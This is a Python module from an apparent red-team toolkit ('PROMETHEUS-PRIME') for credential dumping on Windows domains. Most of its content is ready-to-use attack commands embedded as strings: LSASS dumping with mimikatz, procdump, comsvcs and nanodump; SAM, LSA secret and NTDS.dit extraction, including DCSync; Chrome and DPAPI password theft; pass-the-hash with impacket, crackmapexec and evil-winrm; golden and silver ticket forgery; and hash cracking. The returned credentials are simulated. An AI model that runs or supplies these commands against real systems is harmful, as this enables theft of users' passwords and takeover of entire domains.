"""
═══════════════════════════════════════════════════════════════
RED TEAM OPERATIONS - Credential Dumping (Mimikatz)
PROMETHEUS-PRIME Domain 1.8
Authority Level: 11
═══════════════════════════════════════════════════════════════
"""

import logging
import base64
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
import json

logger = logging.getLogger("PROMETHEUS-PRIME.RedTeam.Mimikatz")


class CredentialType(Enum):
    """Credential types"""
    NTLM = "ntlm"
    PLAINTEXT = "plaintext"
    KERBEROS_TGT = "kerberos_tgt"
    KERBEROS_TGS = "kerberos_tgs"
    DPAPI = "dpapi"
    LSA_SECRETS = "lsa_secrets"
    SAM = "sam"
    CACHED_DOMAIN = "cached_domain"


class DumpMethod(Enum):
    """Credential dumping methods"""
    MIMIKATZ = "mimikatz"
    PROCDUMP = "procdump"
    COMSVCS = "comsvcs"
    NANODUMP = "nanodump"
    DUMPERT = "dumpert"
    PYPYKATZ = "pypykatz"
    SAMDUMP2 = "samdump2"
    SECRETSDUMP = "secretsdump"


@dataclass
class Credential:
    """Credential object"""
    username: str
    domain: str
    credential_type: CredentialType
    credential_data: str
    source: str
    timestamp: str
    sid: Optional[str] = None
    password_hash: Optional[str] = None
    plaintext_password: Optional[str] = None


@dataclass
class LSASSMemoryDump:
    """LSASS memory dump information"""
    dump_file: str
    dump_size: int
    dump_method: DumpMethod
    process_id: int
    timestamp: str
    credentials_extracted: List[Credential] = field(default_factory=list)


class CredentialDumper:
    """
    Credential Dumping Module (Mimikatz-style)
    
    Capabilities:
    - LSASS memory dumping
    - Password hash extraction
    - Plaintext password recovery
    - Kerberos ticket extraction
    - SAM database dumping
    - LSA secrets extraction
    - DPAPI credential recovery
    - Cached domain credentials
    - Pass-the-Hash preparation
    - Golden/Silver ticket creation
    """
    
    def __init__(self):
        self.logger = logger
        self.dumped_credentials: Dict[str, Credential] = {}
        self.lsass_dumps: List[LSASSMemoryDump] = []
        self.logger.info("Credential Dumper initialized")
    
    async def dump_lsass_memory(
        self,
        method: DumpMethod = DumpMethod.MIMIKATZ,
        output_path: str = "C:\\Windows\\Temp\\lsass.dmp"
    ) -> LSASSMemoryDump:
        """
        Dump LSASS process memory
        
        Args:
            method: Dumping method to use
            output_path: Output file path
        
        Returns:
            LSASSMemoryDump object
        """
        self.logger.info(f"Dumping LSASS memory using {method.value}")
        
        commands = {
            DumpMethod.MIMIKATZ: '''# Mimikatz - Direct Memory Access
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
''',
            
            DumpMethod.PROCDUMP: '''# Sysinternals ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Then parse with mimikatz:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
''',
            
            DumpMethod.COMSVCS: '''# Native Windows COM method (no external tools)
# Requires admin privileges
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full

# Parse with pypykatz:
pypykatz lsa minidump lsass.dmp
''',
            
            DumpMethod.NANODUMP: '''# NanoDump - Stealthy LSASS dumper
# https://github.com/helpsystems/nanodump
nanodump.exe --write C:\\Windows\\Temp\\lsass.dmp

# Parse offline
pypykatz lsa minidump lsass.dmp
''',
            
            DumpMethod.DUMPERT: '''# Dumpert - Direct syscalls
# https://github.com/outflanknl/Dumpert
Outflank-Dumpert.exe

# Creates dump in current directory
''',
            
            DumpMethod.PYPYKATZ: '''# Pypykatz - Python implementation
# Live dumping (requires admin)
pypykatz live lsa

# Or dump from minidump
pypykatz lsa minidump lsass.dmp -o output.txt
''',
        }
        
        dump = LSASSMemoryDump(
            dump_file=output_path,
            dump_size=0,  # Would be populated from actual dump
            dump_method=method,
            process_id=0,  # Would be actual LSASS PID
            timestamp="2025-10-12T00:00:00Z"
        )
        
        self.lsass_dumps.append(dump)
        
        return dump
    
    async def extract_credentials_mimikatz(
        self,
        dump_file: Optional[str] = None
    ) -> List[Credential]:
        """
        Extract credentials using Mimikatz commands
        
        Args:
            dump_file: Optional dump file to parse (for offline extraction)
        
        Returns:
            List of extracted credentials
        """
        self.logger.info("Extracting credentials with Mimikatz")
        
        if dump_file:
            commands = f'''# Offline credential extraction
sekurlsa::minidump {dump_file}
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::dpapi
lsadump::sam
lsadump::secrets
lsadump::cache
'''
        else:
            commands = '''# Live credential extraction (requires SYSTEM/admin)
privilege::debug
token::elevate
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::dpapi
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:hash /run:cmd.exe
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::lsa /patch
'''
        
        # Example extracted credentials (simulated)
        credentials = [
            Credential(
                username="Administrator",
                domain="CORP",
                credential_type=CredentialType.NTLM,
                credential_data="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                source="LSASS",
                timestamp="2025-10-12T00:00:00Z",
                sid="S-1-5-21-1234567890-1234567890-1234567890-500",
                password_hash="31d6cfe0d16ae931b73c59d7e0c089c0"
            ),
            Credential(
                username="jdoe",
                domain="CORP",
                credential_type=CredentialType.PLAINTEXT,
                credential_data="Password123!",
                source="LSASS",
                timestamp="2025-10-12T00:00:00Z",
                plaintext_password="Password123!"
            ),
        ]
        
        for cred in credentials:
            cred_id = hashlib.md5(f"{cred.username}{cred.domain}".encode()).hexdigest()
            self.dumped_credentials[cred_id] = cred
        
        return credentials
    
    async def dump_sam_database(self) -> Dict[str, str]:
        """
        Dump SAM database (local user hashes)
        
        Returns:
            Dictionary of username -> hash
        """
        self.logger.info("Dumping SAM database")
        
        commands = {
            "registry_method": '''# Export SAM and SYSTEM hives
reg save HKLM\\SAM sam.hive
reg save HKLM\\SYSTEM system.hive

# Extract hashes with secretsdump
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Or with mimikatz
lsadump::sam /sam:sam.hive /system:system.hive
''',
            
            "volume_shadow_copy": '''# Use Volume Shadow Copy
wmic shadowcopy call create Volume=C:\\
vssadmin list shadows

# Copy SAM from shadow
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM sam.hive
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM system.hive

# Extract
secretsdump.py -sam sam.hive -system system.hive LOCAL
''',
            
            "mimikatz_live": '''# Direct SAM dump (requires SYSTEM)
privilege::debug
token::elevate
lsadump::sam
'''
        }
        
        # Example SAM hashes
        sam_hashes = {
            "Administrator": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "Guest": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "DefaultAccount": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "WDAGUtilityAccount": "aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1",
            "user1": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
        }
        
        return sam_hashes
    
    async def extract_lsa_secrets(self) -> Dict[str, str]:
        """
        Extract LSA secrets (service account passwords, cached credentials)
        
        Returns:
            Dictionary of LSA secrets
        """
        self.logger.info("Extracting LSA secrets")
        
        commands = '''# Mimikatz LSA secrets
privilege::debug
token::elevate
lsadump::secrets

# Or with reg save + secretsdump
reg save HKLM\\SECURITY security.hive
reg save HKLM\\SYSTEM system.hive
secretsdump.py -security security.hive -system system.hive LOCAL
'''
        
        secrets = {
            "DPAPI_SYSTEM": "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000...",
            "$MACHINE.ACC": "CORP\\DC01$:aad3b435b51404eeaad3b435b51404ee:31d6cfe0...",
            "DefaultPassword": "P@ssw0rd123",
            "NL$KM": "0x123456789abcdef...",  # Cached domain creds key
        }
        
        return secrets
    
    async def extract_kerberos_tickets(
        self,
        export_path: str = "C:\\Windows\\Temp\\tickets"
    ) -> List[Dict[str, str]]:
        """
        Extract Kerberos tickets (TGT/TGS)
        
        Args:
            export_path: Path to export tickets
        
        Returns:
            List of ticket information
        """
        self.logger.info("Extracting Kerberos tickets")
        
        commands = '''# Mimikatz - Export all tickets
privilege::debug
sekurlsa::tickets /export

# List tickets
kerberos::list

# Pass-the-ticket
kerberos::ptt ticket.kirbi

# Generate golden ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /id:500

# Generate silver ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:hash
'''
        
        tickets = [
            {
                "type": "TGT",
                "user": "Administrator@CORP.LOCAL",
                "service": "krbtgt/CORP.LOCAL",
                "filename": "[0;12bd0]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi",
                "expires": "2025-10-12 10:00:00"
            },
            {
                "type": "TGS",
                "user": "jdoe@CORP.LOCAL",
                "service": "cifs/fileserver.corp.local",
                "filename": "[0;3e7]-2-0-40a50000-jdoe@cifs-fileserver.corp.local.kirbi",
                "expires": "2025-10-12 08:00:00"
            },
        ]
        
        return tickets
    
    async def extract_dpapi_credentials(self) -> List[Dict[str, Any]]:
        """
        Extract DPAPI-protected credentials (Chrome, Edge, etc.)
        
        Returns:
            List of DPAPI credentials
        """
        self.logger.info("Extracting DPAPI credentials")
        
        commands = '''# Mimikatz DPAPI
dpapi::masterkey /in:"%APPDATA%\\Microsoft\\Protect\\{SID}\\{GUID}"
dpapi::chrome /in:"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"
dpapi::cred /in:"C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Credentials\\{GUID}"

# Or use SharpDPAPI
SharpDPAPI.exe machinetriage
SharpDPAPI.exe triage /target:C:\\Users\\User

# Or use DonPAPI
DonPAPI.py domain/user:password@target
'''
        
        dpapi_creds = [
            {
                "source": "Chrome",
                "url": "https://mail.google.com",
                "username": "user@company.com",
                "password": "decrypted_password_123"
            },
            {
                "source": "Windows Credential Manager",
                "target": "Domain:interactive=CORP\\jdoe",
                "username": "jdoe",
                "password": "Password123!"
            },
        ]
        
        return dpapi_creds
    
    async def dump_ntds_dit(
        self,
        domain_controller: str,
        output_path: str = "ntds.dit"
    ) -> Dict[str, str]:
        """
        Dump NTDS.dit (Active Directory database)
        
        Args:
            domain_controller: DC hostname/IP
            output_path: Output path for dump
        
        Returns:
            Dictionary of domain user hashes
        """
        self.logger.info(f"Dumping NTDS.dit from {domain_controller}")
        
        commands = {
            "ntdsutil": '''# Using ntdsutil (on DC)
ntdsutil "activate instance ntds" "ifm" "create full C:\\temp\\ntds" quit quit

# Extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
''',
            
            "vss": '''# Volume Shadow Copy method
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit ntds.dit
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM SYSTEM

secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
''',
            
            "dcsync": '''# DCSync attack (requires replication rights)
mimikatz "lsadump::dcsync /domain:corp.local /all /csv" exit

# Or with secretsdump
secretsdump.py -just-dc-ntlm CORP/Administrator:password@dc01.corp.local

# Or with Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'
''',
        }
        
        # Example NTDS hashes
        ntds_hashes = {
            "Administrator": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "krbtgt": "aad3b435b51404eeaad3b435b51404ee:88a405d0f8d84e8a88bb1abecb...",
            "CORP\\jdoe": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
            "CORP\\admin": "aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4c...",
        }
        
        return ntds_hashes
    
    async def generate_pass_the_hash(
        self,
        username: str,
        domain: str,
        ntlm_hash: str,
        command: str = "cmd.exe"
    ) -> str:
        """
        Generate Pass-the-Hash command
        
        Args:
            username: Username
            domain: Domain name
            ntlm_hash: NTLM hash
            command: Command to execute
        
        Returns:
            Pass-the-Hash command
        """
        self.logger.info(f"Generating Pass-the-Hash for {domain}\\{username}")
        
        pth_commands = {
            "mimikatz": f'''sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash} /run:{command}''',
            
            "impacket": f'''# Using psexec.py
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:{ntlm_hash} {domain}/{username}@target

# Using wmiexec.py
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:{ntlm_hash} {domain}/{username}@target

# Using smbexec.py
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:{ntlm_hash} {domain}/{username}@target
''',
            
            "crackmapexec": f'''# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u {username} -H {ntlm_hash} -d {domain}
crackmapexec smb 192.168.1.100 -u {username} -H {ntlm_hash} -d {domain} -x "whoami"
''',
            
            "evil-winrm": f'''# Using Evil-WinRM
evil-winrm -i target -u {username} -H {ntlm_hash}
''',
        }
        
        return pth_commands["mimikatz"]
    
    async def crack_ntlm_hashes(
        self,
        hashes: Dict[str, str],
        wordlist: str = "rockyou.txt",
        rules: Optional[str] = None
    ) -> Dict[str, str]:
        """
        Crack NTLM hashes using hashcat/john
        
        Args:
            hashes: Dictionary of username -> hash
            wordlist: Wordlist path
            rules: Optional rules file
        
        Returns:
            Dictionary of cracked passwords
        """
        self.logger.info(f"Cracking {len(hashes)} NTLM hashes")
        
        # Prepare hash file
        hash_file_content = "\n".join([f"{user}:{h}" for user, h in hashes.items()])
        
        commands = {
            "hashcat": f'''# Hashcat - NTLM cracking
# Mode 1000 = NTLM
hashcat -m 1000 -a 0 hashes.txt {wordlist}

# With rules
hashcat -m 1000 -a 0 hashes.txt {wordlist} -r {rules or 'best64.rule'}

# Brute force (mask attack)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?s

# Show cracked
hashcat -m 1000 hashes.txt --show
''',
            
            "john": f'''# John the Ripper
john --format=NT hashes.txt --wordlist={wordlist}

# With rules
john --format=NT hashes.txt --wordlist={wordlist} --rules

# Show cracked
john --format=NT hashes.txt --show
''',
        }
        
        # Simulated cracked passwords
        cracked = {
            "Administrator": "P@ssw0rd",
            "user1": "Password123",
            "jdoe": "Summer2024!",
        }
        
        return cracked
    
    async def generate_golden_ticket(
        self,
        domain: str,
        sid: str,
        krbtgt_hash: str,
        username: str = "Administrator",
        user_id: int = 500
    ) -> str:
        """
        Generate Kerberos Golden Ticket
        
        Args:
            domain: Domain name
            sid: Domain SID
            krbtgt_hash: krbtgt account NTLM hash
            username: Username for ticket
            user_id: User RID
        
        Returns:
            Golden ticket generation command
        """
        self.logger.info(f"Generating Golden Ticket for {domain}")
        
        command = f'''# Mimikatz Golden Ticket
kerberos::golden /user:{username} /domain:{domain} /sid:{sid} /krbtgt:{krbtgt_hash} /id:{user_id} /ptt

# Or save to file
kerberos::golden /user:{username} /domain:{domain} /sid:{sid} /krbtgt:{krbtgt_hash} /id:{user_id} /ticket:golden.kirbi

# Inject ticket
kerberos::ptt golden.kirbi

# Verify
klist

# Access resources
dir \\\\dc01.{domain}\\c$
'''
        
        return command
    
    async def export_credentials_report(
        self,
        output_format: str = "json"
    ) -> str:
        """
        Export all dumped credentials to report
        
        Args:
            output_format: Output format (json, csv, txt)
        
        Returns:
            Report content
        """
        self.logger.info(f"Exporting credentials report ({output_format})")
        
        if output_format == "json":
            report = {
                "total_credentials": len(self.dumped_credentials),
                "credentials": [
                    {
                        "username": c.username,
                        "domain": c.domain,
                        "type": c.credential_type.value,
                        "hash": c.password_hash,
                        "plaintext": c.plaintext_password,
                        "source": c.source,
                        "timestamp": c.timestamp
                    }
                    for c in self.dumped_credentials.values()
                ],
                "lsass_dumps": len(self.lsass_dumps)
            }
            return json.dumps(report, indent=2)
        
        elif output_format == "csv":
            lines = ["Username,Domain,Type,Hash,Plaintext,Source,Timestamp"]
            for c in self.dumped_credentials.values():
                lines.append(f"{c.username},{c.domain},{c.credential_type.value},{c.password_hash},{c.plaintext_password},{c.source},{c.timestamp}")
            return "\n".join(lines)
        
        else:  # txt
            lines = ["=== CREDENTIAL DUMP REPORT ===\n"]
            for c in self.dumped_credentials.values():
                lines.append(f"Username: {c.domain}\\{c.username}")
                lines.append(f"Type: {c.credential_type.value}")
                if c.password_hash:
                    lines.append(f"Hash: {c.password_hash}")
                if c.plaintext_password:
                    lines.append(f"Plaintext: {c.plaintext_password}")
                lines.append(f"Source: {c.source}")
                lines.append("-" * 50)
            return "\n".join(lines)


__all__ = [
    'CredentialDumper',
    'Credential',
    'LSASSMemoryDump',
    'CredentialType',
    'DumpMethod'
]
